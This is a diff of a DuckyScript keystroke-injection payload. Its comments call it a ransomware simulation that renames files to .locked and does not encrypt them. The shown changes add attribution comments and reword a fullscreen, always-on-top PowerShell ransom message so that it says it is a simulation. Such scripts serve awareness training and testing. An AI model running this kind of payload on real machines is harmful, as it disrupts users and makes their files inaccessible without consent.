@@ -1,3 +1,7 @@
+REM This script was created by github.com/MarkCyber
+REM This script is intended to act as a simulation of a ransomware attack
+REM This script will change file extensions to .locked rather than encrypting the files
+
 DELAY 500
 GUI r
 DELAY 100
@@ -21,7 +25,7 @@ ENTER
 DELAY 1000
 
 REM Display ransomware message
-STRING Add-Type -AssemblyName PresentationFramework; $Window = New-Object System.Windows.Window; $Window.WindowStartupLocation = 'CenterScreen'; $Window.WindowState = 'Maximized'; $Window.Topmost = $true; $Window.Content = 'Your files are locked and inaccessible. Contact Shark or your IT support team.'; $Window.ShowDialog()
+STRING Add-Type -AssemblyName PresentationFramework; $Window = New-Object System.Windows.Window; $Window.WindowStartupLocation = 'CenterScreen'; $Window.WindowState = 'Maximized'; $Window.Topmost = $true; $Window.Content = 'Your files have been encrypted. This is a simulation. Please contact your IT support team.'; $Window.ShowDialog()
 ENTER
 DELAY 1000
 
